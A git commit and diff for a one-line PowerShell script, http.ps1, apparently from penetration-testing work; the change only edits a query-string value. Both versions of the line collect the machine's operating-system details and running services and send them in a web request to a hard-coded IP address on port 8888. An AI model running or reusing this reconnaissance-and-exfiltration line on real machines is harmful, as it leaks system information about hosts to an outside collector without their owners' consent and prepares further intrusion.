65d5f18d05d78f0c9ce85708bec2682d767d37c2
tiptip <penusertest@protonmail.com>
2018-07-04 16:11:53 +0400

    change http.ps1
    change http.ps1

--- http.ps1
+++ http.ps1
@@ -1,1 +1,1 @@
-$infos = Get-CimInstance Win32_OperatingSystem | FL *;$task = Get-Service;$uri = 'http://10.36.135.95:8888/post.php?prenom=prout';$LoginResponse=Invoke-WebRequest $uri + $infos + $task -SessionVariable 'Session' -Method 'GET'
+$infos = Get-CimInstance Win32_OperatingSystem | FL *;$task = Get-Service;$uri = 'http://10.36.135.95:8888/post.php?prenom=';$LoginResponse=Invoke-WebRequest $uri + $infos + $task -SessionVariable 'Session' -Method 'GET'
